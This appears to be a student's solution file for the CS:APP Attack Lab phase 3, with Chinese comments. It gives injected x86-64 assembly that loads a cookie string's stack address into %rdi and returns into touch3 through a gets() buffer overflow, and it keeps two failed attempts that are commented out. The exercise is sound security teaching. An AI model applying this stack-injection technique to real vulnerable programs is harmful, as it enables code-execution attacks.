/* fail  存在栈区之后容易被后续代码改写
lea -0xb8(%rsp),%rdi   #rdi *sval
movq $0x59b997fa,-0xb8(%rsp)       #cookie存放位置
pushq  $0x4018fa                   # push touch3
retq

cookie 0x59b997fa   
其ascii 35 39 62 39 39 37 66 61  "59b997fa"
*/  

/*
改成存到废弃的test栈区 fail 64位立即数不能mov给内存
movq $0x3539623939376661,(%rsp)    #cookie存放位置  0x5561dca8
movq $0x5561dca8, %rdi
pushq  $0x4018fa                   # push touch3
retq
*/

# 采用gets溢出将cookie的ascii码放入test栈区
movq $0x5561dca8, %rdi
pushq  $0x4018fa                   # push touch3
retq

